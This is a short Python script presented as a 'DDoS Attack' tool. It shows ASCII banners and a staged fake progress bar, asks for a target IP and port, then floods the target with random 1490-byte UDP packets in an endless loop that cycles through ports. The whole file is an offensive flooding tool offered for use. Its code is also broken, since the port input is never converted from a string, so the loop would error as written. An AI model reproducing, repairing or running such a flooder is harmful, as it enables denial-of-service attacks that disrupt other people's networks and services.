print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet V-DdoS")
os.system("clear")
print("""\033[35m	
   ____  ____       ____       _   _   _             _  	
  |  _ \|  _ \  ___/ ___|     / \ | |_| |_ __ _  ___| | __
  | | | | | | |/ _ \___ \    / _ \| __| __/ _` |/ __| |/ /
  | |_| | |_| | (_) |__) |  / ___ \ |_| || (_| | (__|   < 
  |____/|____/ \___/____/  /_/   \_\__|\__\__,_|\___|_|\_\ © """)
print()
ip = input(" IP Target : => ")
port = input(" Port       : => ")
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print ("\033[92m")
print( "[                    ] 0% ")
time.sleep(3)
print( "[=====               ] 25%")
time.sleep(3)
print( "[==========          ] 50%")
time.sleep(3)
print( "[================    ] 75%")
time.sleep(3)
print( "[====================] 100%")
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print( "Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
